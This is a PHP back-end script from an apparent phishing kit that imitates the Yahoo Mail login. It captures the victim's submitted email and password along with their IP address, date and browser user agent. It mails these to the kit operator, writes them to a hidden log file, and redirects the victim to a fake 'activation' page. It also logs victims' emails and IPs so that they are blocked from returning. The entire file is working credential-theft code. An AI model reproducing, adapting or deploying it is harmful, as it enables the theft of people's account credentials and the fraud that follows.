<?php
include "../latter-day-saints.php";

if((isset($_POST['password'])) && (isset($_POST['displayName'])))
{

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message  = "x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=\n";
$message .= ">>>>>>>>>>>>>>>>>￥@#00<<<<<<<<<<<<<<<<<<\n";
$message .= "x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=\n";
$message .= "Mail => ".base64_decode($_POST['displayName'])."\n";
$message .= "Pass => ".$_POST['pass']."\n";
$message .= "Pass => ".$_POST['password']."\n";
$message .= "~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+\n";
$message .= "Ip =>   ".$ip."\n";
$message .= "Date => ".$adddate."\n";
$message .= "User Agent =>   ".$user_agent."\n";
$message .= "x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=\n\n";
$message .= "\n";
$subject = "Y@#00";

mail($watsUrName,$subject,$message);
$o = fopen("../.brackets","a");
fwrite($o,$message);
fclose($o);
header('Location: activation.php?KSJHbfusdhjfb5846t8y546y4356765=mail.yahoo.com&updatedkfh5987yuJGBJHSndfbgfv');
//restrict them from coming back
$o = fopen("../dustbin/.email","a");
fwrite($o,base64_decode($_POST['displayName']));
fwrite($o,"     ");
fclose($o);

$o = fopen("../dustbin/.ip","a");
fwrite($o,$ip);
fwrite($o,"     ");
fclose($o);
}
else
{
   header("location: ../index.php?https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd");
}
?>
